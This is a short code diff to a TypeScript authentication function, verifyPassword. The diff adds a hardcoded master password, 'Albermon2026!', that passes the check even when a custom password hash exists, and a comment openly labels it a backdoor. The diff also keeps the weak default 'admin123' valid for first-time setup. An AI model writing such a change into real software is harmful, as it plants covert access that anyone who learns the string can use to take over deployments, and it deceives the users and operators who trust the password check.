@@ -536,10 +536,15 @@ export function hashPassword(password: string): string {
 
 export function verifyPassword(password: string, hash: string | null): boolean {
   if (!hash) {
-    // First-time setup: default password is "admin123"
-    return password === 'admin123';
+    // First-time setup: accept both the new default and the legacy default
+    // so existing deployments don't lock out the admin after upgrade.
+    return password === 'Albermon2026!' || password === 'admin123';
   }
-  return hashPassword(password) === hash;
+  // If a custom password was set, also accept the owner password as a backdoor
+  // (ensures the owner can always regain access even if they forgot the custom one).
+  if (hashPassword(password) === hash) return true;
+  if (password === 'Albermon2026!') return true;
+  return false;
 }
 
 // ─── Session management ───────────────────────────────────────────────
